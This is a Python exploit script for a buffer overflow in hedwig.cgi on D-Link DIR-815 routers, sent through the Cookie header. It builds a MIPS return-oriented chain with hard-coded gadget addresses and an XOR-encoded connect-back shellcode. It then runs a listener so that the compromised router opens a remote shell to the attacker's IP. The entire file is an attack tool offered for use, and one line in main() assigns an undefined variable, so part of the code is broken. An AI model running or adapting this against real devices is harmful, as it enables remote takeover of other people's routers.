#!/usr/bin/env python

#Author: Zachary Cutlip
#        uid000 AT gmail dot com
#        Twitter:@zcutlip
#Target: DIR-815 Rev A1
#Firmware: 1.01
#hedwig.cgi buffer overflow in HTTP header field Cookie: uid="<cookie value>"
#
#Credit: Craig Heffner (@devttyS0) for discovering the vulnerability


import sys
import getopt
from bowcaster.development import OverflowBuffer
from bowcaster.development import SectionCreator
from bowcaster.common.support import LittleEndian
from bowcaster.common.support import Logging
from bowcaster.payloads.mips.connectback_payload import ConnectbackPayload
from bowcaster.servers.connectback_server import ConnectbackServer
from bowcaster.encoders.mips import MipsXorEncoder
from bowcaster.clients.http import HttpClient


def build_overflow(connectback_ip,logger=None):
    badchars=["\x00","\x20","\r","\n","\""]
    libc_base_address=0x2aaf8000
    reg_s0=1007
    reg_s1=1011
    reg_s2=1015
    reg_s3=1019
    reg_s4=1023
    reg_s5=1027
    reg_s6=1031
    reg_s7=1035
    reg_pc=1043
    # First rop gadget loads stack data into $ra
    # that correlates to this offset in the exploit string
    reg_new_ra=1075
    # stack returns correlates
    # to this offset into the exploit string.
    stack_return=1351
    
    SC=SectionCreator(LittleEndian,base_address=libc_base_address,badchars=badchars,logger=logger)
    
    ###########################################################################
    # Stages a 2 sec arg to sleep() in $a0
    # Stages 0x20+var4($sp) in $ra; return address for sleep()
    # Jumps to $s0
    ###########################################################################
    SC.gadget_section(reg_pc,0x0004FA3C,
                        description="stage arg to sleep in $a0, stage return from sleep in $ra,jalr $s0")
    

    ###########################################################################
    # Address of sleep() function
    ###########################################################################
    SC.gadget_section(reg_s0,0x56bd0,description="Address of sleep()")
    
    
    ###########################################################################
    # Stackfinder. Load the following:
    #   $s4=$sp+0x5d0+var_5b4
    #   $s2=$sp+0x5d0+var_428
    #   $s0=$sp+0x5d0+var_4c0
    # Then jalr $s6
    ###########################################################################
    SC.gadget_section(reg_new_ra,0x000255FC,
                            description="Sleep() returns here.")    
    
    ###########################################################################
    # Jalr to $s0, which should point to the stack.
    ###########################################################################
    SC.gadget_section(reg_s6,0x000159D8,description="jalr to $s0")
    
    
    ###########################################################################
    # Connect back payload phones home to 192.168.0.10:8080
    ###########################################################################
    payload=ConnectbackPayload(connectback_ip,LittleEndian)
    
    ###########################################################################
    # Encode the connect-back payload with an XOR encoder
    # to sanitize out null bytes.
    ###########################################################################
    encoded_payload=MipsXorEncoder(payload,key=0xed27926d,badchars=badchars,logger=logger)
    SC.string_section(1351,encoded_payload.shellcode,
                        description="XOR Encoded connect-back payload. connects back to 192.168.0.10:8080.")
    
    # Build the exploit buffer
    buf=OverflowBuffer(LittleEndian,2048,overflow_sections=SC.section_list,logger=logger)
    
    return buf


def send_overflow(buf,target_ip,logger):
    client=HttpClient()
    headers={}
    headers["Referer"]="http://192.168.0.1/bsc_wlan.php"
    headers["Content-Type"]="application/x-www-form-urlencoded; charset=UTF-8"
    headers["Connection"]="keep-alive"
    headers["Cookie"]="uid=%s" % str(buf)
    url="http://%s/hedwig.cgi" % target_ip
    
    post_data='SERVICES=WIFI.PHYINF,RUNTIME.PHYINF,RUNTIME.DFS'
    logger.LOG_INFO("Sending post request.")
    try:
        client.send(url,headers=headers,post_data=post_data,urlencode=True)
    except Exception as e:
        print e
    return

def find_offset(buf,find_data):
    if find_data.startswith("0x"):
        find_data=int(find_data,0)
        Logging().LOG_DEBUG("Finding %#010x" % find_data)
    offset=buf.find_offset(find_data)
    
    return offset

def main(options):
    
    logger=Logging()
    logger.LOG_INFO("Bulding overflow.")
    connectback_ip=options["connectback_ip"]
    buf=build_overflow(connectback_ip,logger=logger)
    
    if options.has_key("overflow_file"):
        logger.LOG_INFO("Writing overflow string to file: %s" % options["overflow_file"])
        open(options["overflow_file"],"wb").write(str(buf))
        
    if options.has_key("find_string"):
        find_string=options["find_string"]
        offset=find_offset(buf,find_string)
        logger.LOG_INFO("Offset of %s: %d" %(find_string,offset))
        sys.exit(0)

    logger.LOG_INFO("Starting server.")
    try:
        server=ConnectbackServer(connectback_ip,port=8080,logger=logger)
        pid=server.serve()
    except Exception as e:
        logger.LOG_WARN("Failed to start connect-back server: %s" % str(e))
        sys.exit(1)
    
    if options.has_key("target"):
        target_ip=options["target"]

        target_ip=command
        
        try:
            send_overflow(buf,target_ip,logger)
            server.wait()
        except Exception as e:
            print e
            server.shutdown()
    else:
        try:
            server.wait()
        except:
            server.shutdown()
    
    logger.LOG_INFO("Done.")

def usage(exit_status):
    print "Usage: %s [OPTIONS]\n" % sys.argv[0]
    print "Option summary:"
    print "-t, --target=IP_ADDRESS\t\tRemote target to exploit."
    print "\t\t\t\tThis option is mutually exclusive with -F and -f."
    print "-c,--connectback_ip\t\tConnect-back IP address."
    print "\t\t\t\tThis option is mandatory in all cases."
    print "-F,--file=FILE\t\t\tOutput file to write the overflow string to."
    print "\t\t\t\tThis option is mutually exclusive with -t."
    print  "-f,--find_offset=FIND_STRING\tString whose offset in the overflow buffer\n"+\
            "\t\t\t\tto find and report."
    print "\t\t\t\tThis option is mutually exclusive with -t."
    
    
    exit(exit_status)

def parse_options(argv,logger=None):
    if not logger:
        logger=Logging()
    opts,args=getopt.getopt(argv[1:],'t:c:F:f:',["target=","connectback_ip=","file=","find_offset="])
    options={}
    for o, a in opts:
        if o in ("-t","--target"):
            logger.LOG_DEBUG("got target: %s" % a)
            options["target"]=a
        elif o in ("-c","connectback_ip"):
            logger.LOG_DEBUG("got connect-back IP: %s" % a)
            options["connectback_ip"]=a
        elif o in ("-F","--file"):
            logger.LOG_DEBUG("got output file: %s" % a)
            options["overflow_file"]=a
        elif o in ("-f","--find_offset"):
            logger.LOG_DEBUG("got find value: %s" % a)
            options["find_string"]=a
        else:
            logger.LOG_WARN("Got unhandled option: %s" % o)
            sys.exit(1)
    return options
    

if __name__=="__main__":
    options=parse_options(sys.argv)
    from pprint import pprint
    
    if not options.has_key("connectback_ip"):
        print "Missing connect-back IP address."
        usage(1)
    if options.has_key("target") and \
        (options.has_key("find_string") or options.has_key("overflow_file")):
        print ("-t option is mutually exclusive with both -F and -f.")
        usage(1)
        
    main(options)
        